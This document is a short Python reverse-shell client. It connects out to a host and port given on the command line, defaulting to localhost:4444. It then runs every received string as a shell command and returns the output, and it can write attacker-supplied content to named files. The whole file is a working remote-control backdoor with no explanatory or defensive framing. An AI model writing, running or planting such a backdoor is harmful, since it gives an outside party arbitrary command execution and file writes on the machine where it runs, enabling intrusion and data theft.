import socket
import subprocess
import sys

DEFAULT_HOST = 'localhost'
DEFAULT_PORT = 4444

REMOTE_HOST = DEFAULT_HOST
REMOTE_PORT = DEFAULT_PORT

if len(sys.argv)>1:
    REMOTE_HOST = sys.argv[1]

if len(sys.argv)>2:
    REMOTE_PORT = int(sys.argv[2])

client = socket.socket()
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

try:
    while True:
        print("[-] Awaiting commands...")
        command = client.recv(1024)
        command = command.decode()

        if(command == 'file'):
            file_name = client.recv(1024).decode()
            f = None
            try:
                f = open(file_name, 'w')
                f.write(client.recv(1024).decode())
            finally:
                f.close()

        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        print("[-] Sending response...")
        client.send(output + output_error)
except ConnectionAbortedError:
    print("Connection severed")
except ConnectionResetError:
    print("Connection reset")
finally:
    client.close()
